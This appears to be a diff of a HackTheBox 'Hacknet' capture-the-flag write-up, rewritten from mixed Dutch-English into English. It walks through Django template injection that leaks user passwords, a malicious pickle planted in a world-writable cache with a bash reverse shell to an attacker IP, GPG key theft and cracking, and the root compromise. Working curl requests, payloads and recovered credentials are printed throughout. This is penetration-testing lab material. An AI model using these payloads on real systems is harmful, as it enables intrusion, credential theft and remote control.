-      <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Hacknet]
-└─$ curl -X POST &quot;http://hacknet.htb/likes/15&quot; \
- -H &quot;Cookie: csrftoken=3jkeDNQLSTeaT1WwOzaKE7A7brKoABQO; sessionid=m1v5xxgjp8e0bfiuakl39lnebzyd4sqm&quot; \
- -H &quot;Origin: http://hacknet.htb&quot; \
- -H &quot;Referer: http://hacknet.htb/profile/edit&quot; \
- -F &quot;csrfmiddlewaretoken=5U1p123JolSWKMMZVpm7y0yScEeuHrttY3btuFJk64WWtDylzOmH2XYPdVOI7S97&quot; \
- -F &quot;picture=&quot; \
- -F &quot;email=&quot; \
- -F &quot;username={{users.15.email}}&quot; \
- -F &quot;password=&quot; \
- -F &quot;about=&quot; \
- -F &quot;is_public=on&quot;
-&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/2&quot;&gt;&lt;img src=&quot;/media/2.jpg&quot; title=&quot;hexhunter&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/3&quot;&gt;&lt;img src=&quot;/media/3.jpg&quot; title=&quot;rootbreaker&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/4&quot;&gt;&lt;img src=&quot;/media/4.jpg&quot; title=&quot;zero_day&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/6&quot;&gt;&lt;img src=&quot;/media/6.jpg&quot; title=&quot;shadowcaster&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/7&quot;&gt;&lt;img src=&quot;/media/7.png&quot; title=&quot;blackhat_wolf&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/8&quot;&gt;&lt;img src=&quot;/media/8.png&quot; title=&quot;bytebandit&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/9&quot;&gt;&lt;img src=&quot;/media/9.png&quot; title=&quot;glitch&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/11&quot;&gt;&lt;img src=&quot;/media/11.png&quot; title=&quot;phreaker&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/12&quot;&gt;&lt;img src=&quot;/media/12.png&quot; title=&quot;codebreaker&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/13&quot;&gt;&lt;img src=&quot;/media/13.png&quot; title=&quot;netninja&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/14&quot;&gt;&lt;img src=&quot;/media/14.png&quot; title=&quot;packetpirate&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/15&quot;&gt;&lt;img src=&quot;/media/15.png&quot; title=&quot;darkseeker&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/17&quot;&gt;&lt;img src=&quot;/media/17.jpg&quot; title=&quot;trojanhorse&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/19&quot;&gt;&lt;img src=&quot;/media/19.jpg&quot; title=&quot;exploit_wizard&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/21&quot;&gt;&lt;img src=&quot;/media/21.jpg&quot; title=&quot;whitehat&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/22&quot;&gt;&lt;img src=&quot;/media/22.png&quot; title=&quot;deepdive&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/23&quot;&gt;&lt;img src=&quot;/media/23.jpg&quot; title=&quot;virus_viper&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/24&quot;&gt;&lt;img src=&quot;/media/24.jpg&quot; title=&quot;brute_force&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/25&quot;&gt;&lt;img src=&quot;/media/25.jpg&quot; title=&quot;shadowwalker&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/27&quot;&gt;&lt;img src=&quot;/media/profile.png&quot; title=&quot;deepdive@hacknet.htb&quot;&gt;&lt;/a&gt;&lt;/div&gt;</code></pre></div>
-      <p>I have dit will do voor de user deepdive en below You can de usercredentials vinden van de user.</p>
-      <p>Now that we de inloggevens van de user deepdive hebben, ben I will kijken naar de contacts en daar heb ik gezien dat de user deepdive als contact backdoor_bandit heeft. We zullen dit nu will try doen voor de user backdoor_bandit user. Below You can zien dat de user backdoor_bandit de post van deepdive geliked heeft.</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20251119194527.png" alt="Pasted image 20251119194527.png" loading="lazy" /><span class="img-caption">Pasted image 20251119194527.png</span></div>
-      <p>Now that we de inloggegevens van de deepdive user hadden, ben ik met mijn aangemaakte user een contact verzoek gaan verzenden. Je zal deze met de deepdive user moeten accepteren en zal je after that de post kunnen zien van de deepdive user. Onder deze post heeft de backdoor_bandit user ook geliked. Dus zal je nu hetzelfde kunnen will do dan voor de deepdive user. Here ben ik dus op The following code gekomen en heb ik dus het username en password voor de ssh connectie gaan verkrijgen. Voor als je de verschillende data wilt verkrijgen zal je wel steeds de username van de testuser gaan moeten veranderen naar de 2 volgende zaken. Voor de juiste data te verkrijgen zal je de juiste geliked post moeten gebruiken.</p>
-      <h2 class="writeup-section-title">Change username Test user for username retrievement</h2>
-      <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Hacknet]
+  -H &quot;Cookie: csrftoken=3jkeDNQLSTeaT1WwOzaKE7A7brKoABQO; sessionid=m1v5xxgjp8e0bfiuakl39lnebzyd4sqm&quot; \
+  -H &quot;Origin: http://hacknet.htb&quot; \
+  -H &quot;Referer: http://hacknet.htb/profile/edit&quot; \
+  -F &quot;csrfmiddlewaretoken=...&quot; \
+  -F &quot;username={{users}}&quot;</code></pre></div>
+      <p>You can perform the same change manually at <code>http://hacknet.htb/profile/edit</code> — the result is identical. Visiting the explore or search page that lists the previously liked post now reveals the rendered queryset, exposing valid user information.</p>
+      <h3 class="writeup-sub-title">Exfiltrating Credentials via SSTI</h3>
+      <p>Now that I have confirmed the SSTI works, I can target specific attributes of the user objects. By setting my username to <code>{{users.{index}.email}}</code> and then to <code>{{users.{index}.password}}</code>, the template engine evaluates these expressions server-side and returns the actual email/password fields of the user at the given index. This effectively turns the username field into a database read primitive.</p>
+      <p>I target the user <strong>deepdive</strong> first. Two separate POST requests are needed — one to extract the email, one to extract the password hash:</p>
+      <h4 class="writeup-step-title">Step 1 — Set username to extract email</h4>
+      <div class="code-block"><pre><code class="lang-bash">┌──(kali㉿kali)-[~/HTB/Hacknet]
 └─$ curl -X POST &quot;http://hacknet.htb/profile/edit&quot; \
- -H &quot;Cookie: csrftoken=3jkeDNQLSTeaT1WwOzaKE7A7brKoABQO; sessionid=qnek8cbewxe2yozxsrcscs1tmny7wd5b&quot; \
- -H &quot;Origin: http://hacknet.htb&quot; \
- -H &quot;Referer: http://hacknet.htb/profile/edit&quot; \
- -F &quot;csrfmiddlewaretoken=Z8tMuB1CklHUyHjXtpGyCSeUnr1BMgR9ShDQXeHd24LUhy5j7OG86PERoIBPcHxN&quot; \
- -F &quot;picture=&quot; \
- -F &quot;email=&quot; \
- -F &quot;username={{users.0.email}}&quot; \ 
- -F &quot;password=&quot; \
- -F &quot;about=&quot; \
- -F &quot;is_public=on&quot;
-
-┌──(kali㉿kali)-[~/HTB/Hacknet]
-└─$ curl -X POST &quot;http://hacknet.htb/likes/23&quot; \ 
- -H &quot;Cookie: csrftoken=3jkeDNQLSTeaT1WwOzaKE7A7brKoABQO; sessionid=qnek8cbewxe2yozxsrcscs1tmny7wd5b&quot; \
- -H &quot;Origin: http://hacknet.htb&quot; \ 
- -H &quot;Referer: http://hacknet.htb/profile/edit&quot; \
- -F &quot;csrfmiddlewaretoken=0eqMP1yUvG4lrXdPb19Rl473DBWUFGTVTnAQiEevdp8laOZbPq9rP1x0ESw857zz&quot; \
- -F &quot;picture=&quot; \
- -F &quot;email=&quot; \ 
- -F &quot;username={{users.0.email}}&quot; \ 
- -F &quot;password=&quot; \
- -F &quot;about=&quot; \
- -F &quot;is_public=on&quot; 
-&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/18&quot;&gt;&lt;img src=&quot;/media/18.jpg&quot; title=&quot;backdoor_bandit&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/22&quot;&gt;&lt;img src=&quot;/media/22.png&quot; title=&quot;deepdive&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/27&quot;&gt;&lt;img src=&quot;/media/profile.png&quot; title=&quot;mikey@hacknet.htb&quot;&gt;</code></pre></div>
-      <h2 class="writeup-section-title">Change username Test user for password retrievement</h2>
-      <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Hacknet]
+  -H &quot;Cookie: csrftoken=3jkeDNQLSTeaT1WwOzaKE7A7brKoABQO; sessionid=qnek8cbewxe2yozxsrcscs1tmny7wd5b&quot; \
+  -H &quot;Origin: http://hacknet.htb&quot; \
+  -H &quot;Referer: http://hacknet.htb/profile/edit&quot; \
+  -F &quot;csrfmiddlewaretoken=...&quot; \
+  -F &quot;username={{users.0.email}}&quot;</code></pre></div>
+      <h4 class="writeup-step-title">Step 2 — Set username to extract password</h4>
+      <div class="code-block"><pre><code class="lang-bash">┌──(kali㉿kali)-[~/HTB/Hacknet]
 └─$ curl -X POST &quot;http://hacknet.htb/profile/edit&quot; \
- -H &quot;Cookie: csrftoken=3jkeDNQLSTeaT1WwOzaKE7A7brKoABQO; sessionid=qnek8cbewxe2yozxsrcscs1tmny7wd5b&quot; \
- -H &quot;Origin: http://hacknet.htb&quot; \
- -H &quot;Referer: http://hacknet.htb/profile/edit&quot; \
- -F &quot;csrfmiddlewaretoken=Z8tMuB1CklHUyHjXtpGyCSeUnr1BMgR9ShDQXeHd24LUhy5j7OG86PERoIBPcHxN&quot; \
- -F &quot;picture=&quot; \
- -F &quot;email=&quot; \
- -F &quot;username={{users.0.password}}&quot; \
- -F &quot;password=&quot; \
- -F &quot;about=&quot; \
- -F &quot;is_public=on&quot;
-
-┌──(kali㉿kali)-[~/HTB/Hacknet]
-└─$ curl -X POST &quot;http://hacknet.htb/likes/23&quot; \ 
- -H &quot;Cookie: csrftoken=3jkeDNQLSTeaT1WwOzaKE7A7brKoABQO; sessionid=qnek8cbewxe2yozxsrcscs1tmny7wd5b&quot; \
- -H &quot;Origin: http://hacknet.htb&quot; \
- -H &quot;Referer: http://hacknet.htb/profile/edit&quot; \
- -F &quot;csrfmiddlewaretoken=Jtvnaqs7KI6jlip0Cah6uUqclUKAAi8kCCFrD38Israj49bmgzhGYRQ9mbkO0JOY&quot; \
- -F &quot;picture=&quot; \
- -F &quot;email=&quot; \ 
- -F &quot;username={{users.0.password}}&quot; \
- -F &quot;password=&quot; \
- -F &quot;about=&quot; \
- -F &quot;is_public=on&quot;
-&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/18&quot;&gt;&lt;img src=&quot;/media/18.jpg&quot; title=&quot;backdoor_bandit&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/22&quot;&gt;&lt;img src=&quot;/media/22.png&quot; title=&quot;deepdive&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;likes-review-item&quot;&gt;&lt;a href=&quot;/profile/27&quot;&gt;&lt;img src=&quot;/media/profile.png&quot; title=&quot;**mYd4rks1dEisH3re**&quot;&gt;&lt;/a&gt;&lt;/div&gt;</code></pre></div>
-      <h2 class="writeup-section-title">SSH to Mikey</h2>
-      <p>Door de username en password van above te gebruiken we can een ssh connectie met de server set up. En heb ik de user flag dus gevonden.</p>
-      <div class="code-block"><pre><code>┌──(kali㉿kali)-[~]
-└─$ ssh mikey@hacknet.htb 
-mikey@hacknet.htb&#x27;s password: 
-Linux hacknet 6.1.0-38-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.147-1 (2025-08-02) x86_64
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Wed Nov 19 14:14:44 2025 from 10.10.16.11
-mikey@hacknet:~$ ls
-user.txt
-mikey@hacknet:~$ cat user.txt 
-4c00f758c3a0d8205e7e9acd1eb2d86c
-mikey@hacknet:~$</code></pre></div>
-      <p>Eerst ben ik dus nu will look at of dat we het sudo -l commando konden gebruiken maar dit was zonder success. I have for this dus nu linpeas will run op de machine.</p>
-      <p>Binnen linpeas ben ik op de interestinge output gekomen dat er een localhost op port 3306 kan gedraaid worden en dat er een hacknet folder bestaat van de andere user sandy. Binnen de /var/www/HackNet directory ben I will zoeken naar de naam sandy en daar ben ik op de settings.py file gekomen. Hierin stond de volgende interestinge informatie.</p>
-      <div class="code-block"><pre><code>DATABASES = {
- &#x27;default&#x27;: {
- &#x27;ENGINE&#x27;: &#x27;django.db.backends.mysql&#x27;,
- &#x27;NAME&#x27;: &#x27;hacknet&#x27;,
- &#x27;USER&#x27;: &#x27;sandy&#x27;,
- &#x27;PASSWORD&#x27;: &#x27;h@ckn3tDBpa$$&#x27;,
- &#x27;HOST&#x27;:&#x27;localhost&#x27;,
- &#x27;PORT&#x27;:&#x27;3306&#x27;,
- }
+  -H &quot;Cookie: csrftoken=3jkeDNQLSTeaT1WwOzaKE7A7brKoABQO; sessionid=qnek8cbewxe2yozxsrcscs1tmny7wd5b&quot; \
+  -H &quot;Origin: http://hacknet.htb&quot; \
+  -H &quot;Referer: http://hacknet.htb/profile/edit&quot; \
+  -F &quot;csrfmiddlewaretoken=...&quot; \
+  -F &quot;username={{users.0.password}}&quot;</code></pre></div>
+      <p>After each change, refreshing the explore page (which renders my username as part of the liked-post listing) returns the requested field. With this technique I successfully extract deepdive's credentials.</p>
+      <h3 class="writeup-sub-title">Pivoting to backdoor_bandit</h3>
+      <p>With deepdive's credentials I log in as deepdive and inspect their contact list. I see that deepdive has <strong>backdoor_bandit</strong> as a contact, and that backdoor_bandit has liked one of deepdive's posts.</p>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20251119194527.png" alt="backdoor_bandit visible in deepdive&#x27;s contacts" loading="lazy" /><span class="img-caption">backdoor_bandit visible in deepdive&#x27;s contacts</span></div>
+      <p>To pivot to backdoor_bandit's credentials, I send a contact request from my <code>test</code> user to deepdive, accept it as deepdive, and now my <code>test</code> user can see deepdive's posts and the users that liked them — including backdoor_bandit. I repeat the SSTI extraction procedure on the post backdoor_bandit liked, targeting their user index, and successfully recover their email and password. These credentials happen to be valid SSH credentials for the user <strong>mikey</strong>.</p>
+      <h2 class="writeup-section-title">User Access: SSH as Mikey</h2>
+      <p>With the credentials recovered through the SSTI chain, I authenticate over SSH and obtain a shell as mikey.</p>
+      <div class="code-block"><pre><code class="lang-bash">┌──(kali㉿kali)-[~]
+└─$ ssh mikey@hacknet.htb    
+mikey@hacknet.htb&#x27;s password:
+Linux hacknet 6.1.0-38-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.147-1
+mikey@hacknet:~$ cat user.txt</code></pre></div>
+      <div class="flag-box">
+  <span class="flag-label">🚩 User Flag</span>
+  <code class="flag-value">See output above</code>
+</div>
+      <h2 class="writeup-section-title">Privilege Escalation to sandy</h2>
+      <h3 class="writeup-sub-title">Local Enumeration</h3>
+      <p>I check for misconfigured sudo entries first — but <code>sudo -l</code> requires mikey's password, which we don't have here. I therefore upload and run <strong>linpeas</strong> to perform broad system enumeration.</p>
+      <p>Linpeas reveals two interesting findings: a service listening on <code>localhost:3306</code> (MySQL), and the existence of <code>/var/www/HackNet</code>, which is the Django application directory owned by the user <strong>sandy</strong>. I search the project for references to sandy and find the Django <code>settings.py</code> file containing hardcoded database credentials:</p>
+      <div class="code-block"><pre><code class="lang-python">DATABASES = {
+    &#x27;default&#x27;: {
+        &#x27;ENGINE&#x27;: &#x27;django.db.backends.mysql&#x27;,
+        &#x27;NAME&#x27;: &#x27;hacknet&#x27;,
+        &#x27;USER&#x27;: &#x27;sandy&#x27;,
+        &#x27;PASSWORD&#x27;: &#x27;h@ckn3tDBpa$$&#x27;,
+        &#x27;HOST&#x27;: &#x27;localhost&#x27;,
+        &#x27;PORT&#x27;: &#x27;3306&#x27;,
+    }
 }</code></pre></div>
-      <p>Voor sandy te worden we will een base 64 shell moeten maken so that we deze aan de django cache file kunnen toevoegen.</p>
-      <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Hacknet]
-└─$ cat a.py 
+      <p>However, the goal is to gain code execution <em>as</em> sandy, not just to access the database. The settings file also reveals that the application uses Django's file-based caching backend, with cache files stored in <code>/var/tmp/django_cache/</code> — and these files are <strong>readable and writable by anyone</strong>.</p>
+      <h3 class="writeup-sub-title">Django Cache Pickle Deserialization</h3>
+      <p>Django's file-based cache backend stores cached objects using <strong>Python's pickle module</strong>. When the application later reads a cache entry, it calls <code>pickle.loads()</code> on the file contents. Pickle deserialization is famously unsafe — any object whose class implements <code>__reduce__</code> can execute arbitrary code on deserialization.</p>
+      <p>Because the cache directory is world-writable and the cached file is later loaded by the Django process (running as <strong>sandy</strong>), I can overwrite a cache entry with a malicious pickle payload that triggers a reverse shell when the cache is read.</p>
+      <h4 class="writeup-step-title">Crafting the malicious pickle payload</h4>
+      <div class="code-block"><pre><code class="lang-python">┌──(kali㉿kali)-[~/HTB/Hacknet]
+└─$ cat a.py  
 import pickle
 import base64
 
-# Exploit object
+# Exploit object - __reduce__ is called during pickle deserialization
 class Exploit:
- def __reduce__(self):
- import os
- return (os.system, (&quot;bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/10.10.16.11/4444 &lt;&amp;1&#x27;|bash&quot;,),)
-
+    def __reduce__(self):
+        import os
+        return (os.system, (&quot;bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/10.10.16.11/4444 &lt;&amp;1&#x27;|bash&quot;,),)
 
 payload = base64.b64encode(pickle.dumps(Exploit()))
 print(payload)</code></pre></div>
-      <div class="code-block"><pre><code>mikey@hacknet:/var/tmp/django_cache$ ls -la
+      <p>When this object is unpickled, Python will reconstruct it by calling <code>os.system(...)</code> with the reverse shell command — giving us code execution as the user running Django (sandy).</p>
+      <h4 class="writeup-step-title">Inspecting the cache directory and dropping the payload</h4>
+      <div class="code-block"><pre><code class="lang-bash">mikey@hacknet:/var/tmp/django_cache$ ls -la
 total 16
 drwxrwxrwx 2 sandy www-data 4096 Nov 19 16:05 .
-drwxrwxrwt 4 root root 4096 Nov 19 13:11 ..
--rw------- 1 sandy www-data 34 Nov 19 16:05 1f0acfe7480a469402f1852f8313db86.djcache
--rw------- 1 sandy www-data 3156 Nov 19 16:05 90dbab8f3b1e54369abdeb4ba1efc106.djcache
-mikey@hacknet:/var/tmp/django_cache$ for i in $(ls); do rm -f $i; echo &#x27;gASVVgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDtiYXNoIC1jICdleGVjIGJhc2ggLWkgJj4vZGV2L3RjcC8xMC4xMC4xNi4xMS80NDQ0IDwmMSd8YmFzaJSFlFKULg==&#x27; |base64 -d&gt; $i; chmod 777 $i; done</code></pre></div>
-      <p>voor dat je de connectie met de server krijgt moet je eerst op de explorer en de search refreshen.
-Listener</p>
-      <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Hacknet]
+drwxrwxrwt 4 root  root     4096 Nov 19 13:11 ..
+-rw------- 1 sandy www-data   34 Nov 19 16:05 1f0acfe7480a469402f1852f8313db86.djcache
+-rw------- 1 sandy www-data 3156 Nov 19 16:05 90dbab8f3b1e54369...djcache</code></pre></div>
+      <p>The directory has <code>drwxrwxrwx</code> permissions, so mikey can write to it. I overwrite the existing <code>.djcache</code> file with the pickle payload, ensuring the file header matches Django's cache format (typically <code>1\n</code> followed by the pickled object — but in this case I simply replace the file contents with the raw payload since the backend will attempt to unpickle it on read).</p>
+      <h3 class="writeup-sub-title">Triggering the Cache Read</h3>
+      <p>Before the connection is received, the cache entry has to actually be read. The explore and search pages query cached data — so refreshing those endpoints in the browser triggers the deserialization. I start a listener and then refresh:</p>
+      <div class="code-block"><pre><code class="lang-bash">┌──(kali㉿kali)-[~/HTB/Hacknet]
 └─$ nc -lvnp 4444
 Listening on 0.0.0.0 4444
 Connection received on 10.129.232.4 48482
 bash: cannot set terminal process group (1713): Inappropriate ioctl for device
 bash: no job control in this shell
 sandy@hacknet:/var/www/HackNet$</code></pre></div>
-      <div class="code-block"><pre><code>sandy@hacknet:~/.gnupg$ ls -la
-ls -la
+      <p>The reverse shell connects back as <strong>sandy</strong> — privilege escalation successful.</p>
+      <h2 class="writeup-section-title">Privilege Escalation to root</h2>
+      <h3 class="writeup-sub-title">GPG Backup Key Discovery</h3>
+      <p>As sandy, I enumerate the home directory and find a <code>.gnupg</code> folder containing private keys — including a backup key.</p>
+      <div class="code-block"><pre><code class="lang-bash">sandy@hacknet:~/.gnupg$ ls -la
 total 32
-drwx------ 4 sandy sandy 4096 Sep 5 11:33 .
+drwx------ 4 sandy sandy 4096 Sep  5 11:33 .
 drwx------ 6 sandy sandy 4096 Sep 11 11:18 ..
-drwx------ 2 sandy sandy 4096 Sep 5 11:33 openpgp-revocs.d
-drwx------ 2 sandy sandy 4096 Sep 5 11:33 private-keys-v1.d
--rw-r--r-- 1 sandy sandy 948 Sep 5 11:33 pubring.kbx
--rw------- 1 sandy sandy 32 Sep 5 11:33 pubring.kbx~
--rw------- 1 sandy sandy 600 Sep 5 11:33 random_seed
--rw------- 1 sandy sandy 1280 Sep 5 11:33 trustdb.gpg
-sandy@hacknet:~/.gnupg$ cd pri
-cd private-keys-v1.d/
-sandy@hacknet:~/.gnupg/private-keys-v1.d$ ls -la
-ls -la
-total 20
-drwx------ 2 sandy sandy 4096 Sep 5 11:33 .
-drwx------ 4 sandy sandy 4096 Sep 5 11:33 ..
--rw------- 1 sandy sandy 1255 Sep 5 11:33 0646B1CF582AC499934D8503DCF066A6DCE4DFA9.key
--rw------- 1 sandy sandy 2088 Sep 5 11:33 armored_key.asc
--rw------- 1 sandy sandy 1255 Sep 5 11:33 EF995B85C8B33B9FC53695B9A3B597B325562F4F.key
-sandy@hacknet:~/.gnupg/private-keys-v1.d$</code></pre></div>
-      <p>private armored key file naar je eigen machine nemen password cracken door john te gebruiken.</p>
-      <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Hacknet]
-└─$ wget http://10.129.232.4:8000/armored_key.asc //
-armored_key.asc 100%[=============================================&gt;] 2.04K --.-KB/s in 0.01s 
-
-2025-11-20 01:59:49 (150 KB/s) - ‘armored_key.asc’ saved [2088/2088]
-
-┌──(kali㉿kali)-[~/HTB/Hacknet]
-└─$ gpg2john armored_key.asc &gt; hash.txt
-
-┌──(kali㉿kali)-[~/HTB/Hacknet]
-└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
-//
-sweetheart (Sandy) 
-//</code></pre></div>
-      <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Hacknet]
+drwx------ 2 sandy sandy 4096 Sep  5 11:33 openpgp-revocs.d
+drwx------ 2 sandy sandy 4096 Sep  5 11:33 private-keys-v1.d
+-rw-r--r-- 1 sandy sandy  948 Sep  5 11:33 ...</code></pre></div>
+      <p>Sandy has an exported armored key file (<code>armored_key.asc</code>) plus a directory full of encrypted database backups (<code>backup*.sql.gpg</code>). The plan: exfiltrate the private key to my own machine, import it locally, and use it to decrypt the database backups — which may contain additional credentials.</p>
+      <h3 class="writeup-sub-title">Exfiltrating & Decrypting the Backups</h3>
+      <p>On the target I start a quick HTTP server to serve the key, then pull it down on my Kali host.</p>
+      <div class="code-block"><pre><code class="lang-bash">┌──(kali㉿kali)-[~/HTB/Hacknet]
+└─$ wget http://10.129.232.4:8000/armored_key.asc
+armored_key.asc  100%[=================&gt;]   2.04K  --.-KB/s    in 0.01s   
+2025-11-20 01:59:49 (150 KB/s) - &#x27;armored_key.asc&#x27; saved [2088/2088]</code></pre></div>
+      <p>I import the key into my local GPG keyring. Because the key was exported with the private material, this gives my user full control of sandy's identity.</p>
+      <div class="code-block"><pre><code class="lang-bash">┌──(kali㉿kali)-[~/HTB/Hacknet]
 └─$ gpg --import armored_key.asc
-
 gpg: key D72E5C1FA19C12F7: public key &quot;Sandy (My key for backups) &lt;sandy@hacknet.htb&gt;&quot; imported
 gpg: key D72E5C1FA19C12F7: secret key imported
 gpg: Total number processed: 1
-gpg: imported: 1
-gpg: secret keys read: 1
-gpg: secret keys imported: 1</code></pre></div>
-      <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Hacknet]
+gpg:               imported: 1
+gpg:       secret keys read: 1
+gpg:       secret keys imported: 1</code></pre></div>
+      <p>After downloading the encrypted backups in the same way, I decrypt each <code>.gpg</code> file. The private key is now in my keyring, so GPG decrypts the files without prompting for a passphrase.</p>
+      <div class="code-block"><pre><code class="lang-bash">┌──(kali㉿kali)-[~/HTB/Hacknet]
 └─$ gpg --decrypt backup01.sql.gpg &gt; backup01.sql
-gpg: encrypted with rsa1024 key, ID FC53AFB0D6355F16, created 2024-12-29
- &quot;Sandy (My key for backups) &lt;sandy@hacknet.htb&gt;&quot;
-
 ┌──(kali㉿kali)-[~/HTB/Hacknet]
-└─$ gpg --decrypt backup02.sql.gpg &gt; backup02.sql
-gpg: encrypted with rsa1024 key, ID FC53AFB0D6355F16, created 2024-12-29
- &quot;Sandy (My key for backups) &lt;sandy@hacknet.htb&gt;&quot;
- 
-┌──(kali㉿kali)-[~/HTB/Hacknet]
-└─$ gpg --decrypt backup03.sql.gpg &gt; backup03.sql
-gpg: encrypted with rsa1024 key, ID FC53AFB0D6355F16, created 2024-12-29
- &quot;Sandy (My key for backups) &lt;sandy@hacknet.htb&gt;&quot;</code></pre></div>
-      <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Hacknet]
+└─$ gpg --decrypt backup02.sql.gpg &gt; backup02.sql</code></pre></div>
+      <p>Grepping the decrypted backups for password-related strings reveals a forum post in which a user has leaked their own root password while bragging about brute-force techniques.</p>
+      <div class="code-block"><pre><code class="lang-bash">┌──(kali㉿kali)-[~/HTB/Hacknet]
 └─$ cat backup02.sql | grep password
-(26,&#x27;Brute force attacks may be noisy, but they’re still effective. I’ve been refining my techniques to make them more efficient, reducing the time it takes to crack even the most complex passwords. Writing up a guide on how to optimize your brute force attacks.&#x27;,&#x27;2024-08-30 14:19:57.000000&#x27;,6,2,0,24);
-(11,&#x27;Reducing the time to crack complex passwords is no small feat. Even though brute force is noisy, it’s still one of the most reliable methods out there. Your guide will be a must-read for anyone looking to sharpen their skills in this area!&#x27;,&#x27;2024-09-02 09:04:13.000000&#x27;,26,7);
-(47,&#x27;2024-12-29 20:29:36.987384&#x27;,&#x27;Hey, can you share the MySQL root password with me? I need to make some changes to the database.&#x27;,1,22,18),
-(48,&#x27;2024-12-29 20:29:55.938483&#x27;,&#x27;The root password? What kind of changes are you planning?&#x27;,1,18,22),
-(50,&#x27;2024-12-29 20:30:41.806921&#x27;,&#x27;Alright. But be careful, okay? Here’s the password: **h4ck3rs4re3veRywh3re99**. Let me know when you’re done.&#x27;,1,18,22),
- `password` varchar(70) NOT NULL,
-(24,&#x27;brute_force@ciphermail.com&#x27;,&#x27;brute_force&#x27;,&#x27;BrUt3F0rc3#&#x27;,&#x27;24.jpg&#x27;,&#x27;Specializes in brute force attacks and password cracking. Loves the challenge of breaking into locked systems.&#x27;,0,0,1,0,0),
- `password` varchar(128) NOT NULL,</code></pre></div>
-      <div class="code-block"><pre><code>mikey@hacknet:~$ su root
+(26,&#x27;Brute force attacks may be noisy, but they’re still effective. ...</code></pre></div>
+      <h3 class="writeup-sub-title">Becoming root</h3>
+      <p>With the password from the backup in hand, I use <code>su root</code> from mikey's session and read the root flag.</p>
+      <div class="code-block"><pre><code class="lang-bash">mikey@hacknet:~$ su root
 Password: 
 root@hacknet:/home/mikey# cat /root/root.txt 
-5e413a4c1dc293afc6cb7644b18dd2e8
-root@hacknet:/home/mikey#</code></pre></div>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20251119224917.png" alt="Pasted image 20251119224917.png" loading="lazy" /><span class="img-caption">Pasted image 20251119224917.png</span></div>
+5e413a4c1dc293afc6cb7644b18dd2e8</code></pre></div>
+      <div class="flag-box">
+  <span class="flag-label">🚩 Root Flag</span>
